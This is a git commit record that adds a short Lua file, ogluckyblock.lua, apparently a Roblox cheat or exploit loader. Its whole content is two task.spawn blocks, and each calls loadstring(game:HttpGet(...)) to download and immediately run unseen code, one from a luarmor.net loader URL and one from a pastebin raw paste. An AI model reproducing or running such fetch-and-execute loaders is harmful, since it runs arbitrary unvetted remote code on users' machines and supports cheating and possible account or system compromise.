2edcd378cb019305dbe2dbfa0c2e6e6c2e9cd587
masiacoding <masapara190@gmail.com>
2026-03-24 16:27:42 +0200

    Update and rename sabscript.lua to ogluckyblock.lua

---
+++ ogluckyblock.lua
@@ -0,0 +1,7 @@
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/583e63cb6b4c4b78d6a9e05560e3275b.lua"))()
+    end)
+
+task.spawn(function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/gdPLWmFG"))()
+end)
